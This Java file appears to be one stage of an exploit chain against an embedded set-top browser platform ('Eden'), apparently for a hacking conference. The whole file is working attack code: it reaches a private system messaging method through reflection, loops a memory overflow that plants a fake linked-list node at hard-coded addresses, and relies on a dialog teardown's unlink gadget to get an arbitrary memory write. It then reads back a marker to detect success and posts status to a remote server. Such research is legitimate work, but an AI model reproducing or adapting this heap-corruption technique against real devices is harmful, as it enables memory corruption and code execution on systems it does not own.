package org.junkyard;

import com.planetweb.eden.client.Eden;
import com.planetweb.eden.client.system.SystemInterface;
import com.planetweb.eden.client.service.Service;
import com.planetweb.eden.client.service.ServiceInfo;
import java.lang.reflect.Method;

/**
 * CHAIN "looparm" -- user-armed native auto-fire. NO GDB, no openURL (so nothing
 * blocks). The USER opens+closes a browser modal dialog (address book / favorites
 * / file / Go-To) to arm the IM context (gate 0x8C1B7488 + struct). This service
 * just LOOPS the overflow so a fresh fakeNode is always planted at *(0x8C29AC2C) +
 * the node array *(0x8C29AC30) when the user closes the dialog -> the teardown
 * (sub_8C034920) runs the unlink gadget on our node -> arbitrary write aimed at
 * 0x8C29ABE6, which we read back via getRawDeviceID(101) to SELF-DETECT the fire.
 *
 * Sequence the user performs (repeatedly): open a dialog, wait ~2s (we re-plant),
 * close it. When the gadget fires, marker 0x8C29ABE6 := 0x8C29AE00 and we POST.
 */
public class LoopArm extends Service {

    // fakeNode must be a VALID IM node so the open dialog's list-walk (node->next @+0x3C)
    // doesn't follow garbage and crash. So fakeNode->next points to a fully-ZEROED
    // terminator node (TERM) inside the payload: TERM->next(+0x3C)=0 ends the walk, and
    // TERM+0x40 is writable for the gadget's 2nd write. The unlink write puts fakeNode->next
    // (=TERM addr) into 0x8C29ABE6 -> we read TERM back via getRawDeviceID = the fire marker.
    static final int DST=0x8C29ABE6, FAKE=0x8C29ACE6, TERM=0x8C29AE26, PREV=DST-0x3C;
    static final int NODEG=0x8C29AC2C, ARRG=0x8C29AC30;
    static final int NEXT=TERM;     // value written by the gadget == fire marker
    static final int BASE=0xAAAAAAAA;

    Method send;
    public ServiceInfo getInfo(){ return new ServiceInfo("JunkyardLoopArm","1.0","DistrictCon",Junk.BASE); }
    static void p32(byte[] b,int o,int v){ b[o]=(byte)v;b[o+1]=(byte)(v>>8);b[o+2]=(byte)(v>>16);b[o+3]=(byte)(v>>24); }
    Object msg(int c,Object a,Object b){
        try{ return send.invoke(Eden.getSystemInterface(),new Object[]{new Integer(c),a,b}); }
        catch(Throwable t){ return null; }
    }
    byte[] payload(){
        byte[] p=new byte[0x300];       // covers fakeNode(0x100) + TERM(0x240)+fields; rest zeroed
        p32(p,0,BASE);                  // 0x8C29ABE6 baseline (-> TERM addr if gadget fires)
        p32(p,NODEG-DST,FAKE);          // *(0x8C29AC2C)=fakeNode
        p32(p,ARRG-DST,FAKE);           // *(0x8C29AC30)[0]=fakeNode
        p32(p,(FAKE-DST)+0x3C,TERM);    // fakeNode->next = TERM (valid zeroed node; gadget write value)
        p32(p,(FAKE-DST)+0x40,PREV);    // fakeNode->prev -> write lands at 0x8C29ABE6
        // TERM (offset 0x240) is left all-zero: TERM->next(+0x3C)=0 terminates the walk,
        // TERM+0x40 (offset 0x280, < 0x300) is writable for the gadget's 2nd write.
        return p;
    }
    int marker(){
        Object r=msg(101,null,null); byte[] d=null;
        if(r instanceof byte[]) d=(byte[])r; else if(r instanceof String) d=((String)r).getBytes();
        if(d==null||d.length<4) return -1;
        return (d[0]&0xff)|((d[1]&0xff)<<8)|((d[2]&0xff)<<16)|((d[3]&0xff)<<24);
    }
    public void run(){
        Junk.banner("CHAIN looparm -- USER arms a dialog; we loop-plant + self-detect (no GDB)");
        Junk.prove();
        try{
            send=SystemInterface.class.getDeclaredMethod("sendMessage",
                new Class[]{Integer.TYPE,Object.class,Object.class});
            send.setAccessible(true);
            Junk.httpPost(Junk.BASE+"/arm","# looparm start -- OPEN+CLOSE a browser dialog repeatedly\n");
            for(int i=0;i<200;i++){          // ~10 min
                int m=marker();
                if(m==NEXT){
                    Junk.httpPost(Junk.BASE+"/arm","*** GADGET FIRED (autonomous, user-armed dialog) marker=0x"+Integer.toHexString(m)+" ***\n");
                    Eden.println("[+] FIRED at iter "+i);
                    break;
                }
                msg(100,payload(),null);      // re-plant fakeNode + node array
                if(i%10==0) Junk.httpPost(Junk.BASE+"/arm","iter "+i+" marker=0x"+Integer.toHexString(m)+" (open/close a dialog now)\n");
                try{ Thread.sleep(7000); }catch(Throwable t){}
            }
            Eden.println("[looparm] done");
        }catch(Throwable t){ Eden.println("[!] looparm: "+t); }
    }
}
